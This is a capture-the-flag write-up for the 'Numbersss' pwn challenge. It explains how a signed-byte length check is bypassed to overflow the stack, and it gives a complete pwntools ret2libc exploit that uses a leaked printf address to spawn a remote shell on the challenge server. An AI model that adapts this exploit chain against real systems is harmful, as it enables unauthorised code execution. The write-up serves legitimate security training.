# Numbersss

Sometimes computer numbers can be so harddd

nc numbersss.chal.cyberjousting.com 1351

## Challenge

```
└─$ ./numbersss
Free junk: 0x7f2247685b30
How many bytes do you want to read in?
1
1
```

Running the program spit this out. Looks like we are given some address here, lets run our checks and open her up.

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
```c
void vuln(void)

{
  undefined local_18 [16];
  
  printf("Free junk: %p\n",printf);
  puts("How many bytes do you want to read in?");
  __isoc99_scanf(&DAT_0040203f,&length);
  if ('\x10' < length) {
    puts("Too many bytes!");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  for (counter = '\0'; counter != length; counter = counter + '\x01') {
    read(0,local_18 + counter,1);
  }
  return;
}
```

Looking at this vuln function we see that the address that was being given to us is the address of printf. This will be important as we will be able to calculate libc base from it. Moving forward we see that the scanf is reading in a `%hhd` to length. We can manipulate this to allow us to write more than `\x10` bytes. For example, if we input -1 it will actually register as 256-1 when being compared to counter because of byte comparison.

So our objectives here will be to calculate the libc address with the given printf address, then we will want to overflow into the return address and place a rop chain that calls the shell.

Playing around with the number that I wanted to input to bypass the `"Too many bytes!"` counter made me land on `-129`. This gave me more than enough space to write my chain and was bypassing the check. It left me with 256-127 bytes (129).

One last thing I needed to iron out before exploiting was the libc file. I wasn't given a libc file with the challenge and actually thought I was supposed to leak more libc addresses in the program and ended up wasting a bunch of time. A teammate pointed me in the right direction and helped me realize it was the libc that was on the docker image given to us. I exfilled both the libc and the linker and used it for my exploit.

```python
from pwn import *

elf = context.binary = ELF('./numbersss')
libc = ELF('./libc.so.6')

#p = process('./numbersss')
p = remote('numbersss.chal.cyberjousting.com', 1351)

#Grabbing printf address
p.recvuntil(b'Free junk: ')
printf = int(p.recvuntil(b'\n').strip(),16)
log.info("Printf Address: {}".format(hex(printf)))

#Offset to return address and length of total payload
offset = 24
length = 129

libc.address = printf - libc.sym['printf']
log.info(hex(libc.address))

#Building rop chain
rop = ROP(libc)
rop.call((rop.find_gadget(["ret"])))
rop.call((rop.find_gadget(["pop rdi", "ret"]))[0])
rop.call(next(libc.search(b'/bin/sh\x00')))
rop.call(libc.sym['system'])

raw_rop = rop.chain()
p.sendlineafter(b'How many bytes do you want to read in?', b'-127')
p.sendline(b'A' * offset + raw_rop  + (b'A'*(length-offset-len(raw_rop))))
p.interactive()
```

After all is done it really is just a standard ret2libc attack with a tricky little number manipulation in the middle.

## Flag

`byuctf{gotta_pay_attention_to_the_details!}`